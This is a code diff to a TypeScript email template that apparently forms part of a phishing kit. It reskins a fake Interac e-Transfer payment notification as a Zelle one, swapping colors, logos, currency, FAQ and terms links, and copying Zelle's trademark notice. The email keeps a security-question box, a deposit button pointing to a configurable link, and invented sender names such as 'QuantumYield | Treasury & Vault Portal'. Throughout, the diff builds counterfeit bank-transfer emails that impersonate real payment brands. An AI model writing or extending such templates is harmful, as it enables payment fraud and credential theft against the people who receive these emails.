@@ -18,7 +18,7 @@ function wrapEmail(html: string): string {
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <title>Interac e-Transfer</title>
+  <title>Zelle Payment</title>
   <style>
     body{margin:0;padding:0;background:#eaeced;font-family:Arial,sans-serif}
     table{border-collapse:collapse}
@@ -32,7 +32,7 @@ function wrapEmail(html: string): string {
 }
 
 export function renderInteracEmail(data: EmailData, mode: EmailLangMode = "en"): string {
-  const amount = `$${data.amount.toFixed(2)} CAD`
+  const amount = `$${data.amount.toFixed(2)} USD`
   const date = new Date().toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric" })
 
   const renderOne = (lang: EmailLang) => {
@@ -42,23 +42,23 @@ export function renderInteracEmail(data: EmailData, mode: EmailLangMode = "en"):
       <div style="background-color:#eaeced;font-family:Arial,sans-serif;width:100%">
         <div style="max-width:600px;margin:0 auto;background-color:#fff">
           <!-- Header: table-based for full email-client compatibility -->
-          <!-- Yellow accent bar -->
+          <!-- Purple accent bar -->
           <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color:#0a0a0a;">
-            <tr><td height="3" style="background-color:#FDB913;font-size:0;line-height:0;">&nbsp;</td></tr>
+            <tr><td height="3" style="background-color:#6D1ED4;font-size:0;line-height:0;">&nbsp;</td></tr>
           </table>
           <!-- Main header row -->
           <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color:#0a0a0a;border-bottom:1px solid #1a1a1a;">
             <tr>
-              <!-- Left: logo + divider + brand -->
+              <!-- Left: Z logo + divider + brand -->
               <td style="padding:13px 24px;" valign="middle">
                 <table cellpadding="0" cellspacing="0" border="0">
                   <tr>
-                    <!-- Interac logo in yellow square -->
+                    <!-- Zelle Z in purple square -->
                     <td valign="middle">
                       <table cellpadding="0" cellspacing="0" border="0">
                         <tr>
-                          <td width="44" height="44" style="background-color:#FDB913;border-radius:8px;text-align:center;vertical-align:middle;padding:6px;">
-                            <img src="https://etransfer-notification.interac.ca/images/new/interac_logo.png" alt="Interac" width="32" height="32" style="display:block;width:32px;height:32px;" />
+                          <td width="44" height="44" style="background-color:#6D1ED4;border-radius:8px;text-align:center;vertical-align:middle;">
+                            <span style="font-family:Arial,sans-serif;font-size:24px;font-weight:900;color:#ffffff;line-height:44px;">Z</span>
                           </td>
                         </tr>
                       </table>
@@ -83,17 +83,17 @@ export function renderInteracEmail(data: EmailData, mode: EmailLangMode = "en"):
                   </tr>
                 </table>
               </td>
-              <!-- Right: E-TRANSFER badge -->
+              <!-- Right: ZELLE badge -->
               <td style="padding:13px 24px;" valign="middle" align="right">
                 <table cellpadding="0" cellspacing="0" border="0">
                   <tr>
-                    <td style="background-color:#FDB913;border-radius:4px;padding:8px 14px;vertical-align:middle;white-space:nowrap;">
+                    <td style="background-color:#6D1ED4;border-radius:4px;padding:8px 14px;vertical-align:middle;white-space:nowrap;">
                       <table cellpadding="0" cellspacing="0" border="0">
                         <tr>
                           <td width="8" valign="middle" style="padding-right:6px;">
-                            <table cellpadding="0" cellspacing="0" border="0"><tr><td width="7" height="7" style="background-color:#000000;border-radius:50%;font-size:0;line-height:0;">&nbsp;</td></tr></table>
+                            <table cellpadding="0" cellspacing="0" border="0"><tr><td width="7" height="7" style="background-color:#ffffff;border-radius:50%;font-size:0;line-height:0;opacity:0.5;">&nbsp;</td></tr></table>
                           </td>
-                          <td style="font-family:Arial,sans-serif;font-size:12px;font-weight:700;color:#000000;letter-spacing:0.07em;text-transform:uppercase;white-space:nowrap;">E&#8209;TRANSFER</td>
+                          <td style="font-family:Arial,sans-serif;font-size:12px;font-weight:700;color:#ffffff;letter-spacing:0.07em;text-transform:uppercase;white-space:nowrap;">ZELLE</td>
                         </tr>
                       </table>
                     </td>
@@ -111,8 +111,8 @@ export function renderInteracEmail(data: EmailData, mode: EmailLangMode = "en"):
               <p style="font-size:16px;line-height:1.5;margin:0 0 16px 0">${copy.description(amount)}</p>
 
               <!-- Amount Box -->
-              <div style="margin-top:24px;padding:16px;background-color:#FDB913;border-radius:8px">
-                <p style="font-size:18px;font-weight:600;margin:0">${copy.amountLabel} ${amount}</p>
+              <div style="margin-top:24px;padding:16px;background-color:#6D1ED4;border-radius:8px">
+                <p style="font-size:18px;font-weight:600;margin:0;color:#ffffff">${copy.amountLabel} ${amount}</p>
               </div>
             </div>
 
@@ -120,7 +120,7 @@ export function renderInteracEmail(data: EmailData, mode: EmailLangMode = "en"):
               data.message
                 ? `
             <div style="padding:0 72px;margin-top:32px">
-              <div style="background-color:#f9fafb;border-left:4px solid #FDB913;padding:16px;border-radius:4px">
+              <div style="background-color:#f9fafb;border-left:4px solid #6D1ED4;padding:16px;border-radius:4px">
                 <p style="font-size:14px;font-weight:600;color:#374151;margin:0 0 8px 0">${copy.messageLabel}</p>
                 <p style="font-size:16px;color:#111827;margin:0">${data.message}</p>
               </div>
@@ -160,7 +160,7 @@ export function renderInteracEmail(data: EmailData, mode: EmailLangMode = "en"):
 
             <!-- Security Question -->
             <div style="padding:0 72px;margin-top:32px">
-              <div style="background-color:#fef3c7;border:2px solid #FDB913;border-radius:8px;padding:20px">
+              <div style="background-color:#f5f0ff;border:2px solid #6D1ED4;border-radius:8px;padding:20px">
                 <h4 style="font-weight:700;font-size:16px;margin:0 0 12px 0">🔒 ${copy.securityQuestionHeading}</h4>
                 <p style="font-size:14px;color:#374151;margin:0 0 12px 0">${data.securityQuestion}</p>
                 <div style="background-color:#fff;border:1px solid #d1d5db;padding:12px;border-radius:4px">
@@ -172,7 +172,7 @@ export function renderInteracEmail(data: EmailData, mode: EmailLangMode = "en"):
 
             <!-- Deposit Button -->
             <div style="padding:0 72px;margin-top:32px;text-align:center">
-              <a href="${data.depositLink}" style="display:inline-block;background-color:#FDB913;color:#000;font-weight:700;padding:16px 32px;font-size:16px;border-radius:8px;text-decoration:none">${copy.depositCta}</a>
+              <a href="${data.depositLink}" style="display:inline-block;background-color:#6D1ED4;color:#ffffff;font-weight:700;padding:16px 32px;font-size:16px;border-radius:8px;text-decoration:none">${copy.depositCta}</a>
             </div>
 
             <!-- How to Deposit -->
@@ -199,16 +199,15 @@ export function renderInteracEmail(data: EmailData, mode: EmailLangMode = "en"):
             <div style="padding:0 72px;margin-top:48px">
               <div style="text-align:center">
                 <div style="display:flex;align-items:center;justify-content:center;gap:8px;font-size:12px;margin-bottom:16px">
-                  <a href="https://www.interac.ca/en/interac-etransfer/etransfer-faq" style="color:#2563eb" target="_blank">FAQ</a>
+                  <a href="https://www.zellepay.com/faq" style="color:#6D1ED4" target="_blank">FAQ</a>
                   <span style="color:#c5b9ac">|</span>
                   <span style="font-style:italic;color:#404040">This is a secure transaction.</span>
-                  <img src="https://etransfer-notification.interac.ca/images/new/lock.png" width="11" height="14" alt="Lock" style="display:inline-block" />
                 </div>
                 <p style="font-size:12px;color:#666;font-style:italic;margin:0 0 16px 0">
-                  For your security, please do not forward this email as it contains confidential information meant only for you. Interac will never request access to this email notification from you.
+                  For your security, please do not forward this email as it contains confidential information meant only for you. Zelle will never request access to this email notification from you.
                 </p>
                 <p style="font-size:12px;color:#666;margin:0">
-                  Click here to <a href="#" style="color:#2563eb">manage notification preferences</a> from this contact. You will still be able to receive Interac e-Transfer transactions and notifications.
+                  Click here to <a href="#" style="color:#6D1ED4">manage notification preferences</a> from this contact. You will still be able to receive Zelle payment notifications.
                 </p>
               </div>
             </div>
@@ -219,22 +218,26 @@ export function renderInteracEmail(data: EmailData, mode: EmailLangMode = "en"):
             <table width="100%" cellpadding="0" cellspacing="0">
               <tr>
                 <td valign="top" width="50%">
-                  <img alt="INTERAC e-Transfer" style="height:40px;display:block" src="https://etransfer-notification.interac.ca/images/new/interac_logo.png" />
+                  <table cellpadding="0" cellspacing="0" border="0">
+                    <tr>
+                      <td width="40" height="40" style="background-color:#6D1ED4;border-radius:8px;text-align:center;vertical-align:middle;">
+                        <span style="font-family:Arial,sans-serif;font-size:22px;font-weight:900;color:#ffffff;line-height:40px;">Z</span>
+                      </td>
+                    </tr>
+                  </table>
                 </td>
                 <td valign="top" width="50%" style="text-align:right;font-size:14px">
-                  <p style="margin:0">2000 - 2025 Interac Corp.</p>
+                  <p style="margin:0">&copy; ${new Date().getFullYear()} Zelle.</p>
                   <p style="margin:0">All rights reserved.</p>
-                  <a href="https://www.interac.ca/en/interac-e-transfer-terms-of-use/" style="color:#2563eb" target="_blank">Terms of Use</a>
-                  <p style="margin:4px 0 0 0">Trade-Mark of Interac Corp.</p>
-                  <p style="margin:0">Interac Corp.</p>
-                  <p style="margin:0">P.O. Box 45, Toronto, Ontario M5J 2J1</p>
+                  <a href="https://www.zellepay.com/terms-of-use" style="color:#6D1ED4" target="_blank">Terms of Use</a>
+                  <p style="margin:4px 0 0 0">Zelle and the Zelle related marks are property of Early Warning Services, LLC.</p>
                 </td>
               </tr>
             </table>
             <div style="border-top:1px solid #e5e7eb;margin-top:16px;padding-top:16px">
               <p style="font-size:12px;color:#373737;line-height:1.6;margin:0">
                 Email or text messages carry the notice while the financial institutions securely transfer the money using existing payment networks.<br/><br/>
-                This email was sent to you by Interac Corp., the owner of the Interac e-Transfer service, on behalf of <strong>${data.senderName || "Global Payments v2 Banking System"}</strong> at <strong>${data.institution || "QuantumYield | Treasury & Vault Portal"}</strong>.
+                This email was sent to you by Zelle on behalf of <strong>${data.senderName || "QuantumYield Banking System"}</strong> at <strong>${data.institution || "QuantumYield | Treasury & Vault Portal"}</strong>.
               </p>
             </div>
           </div>
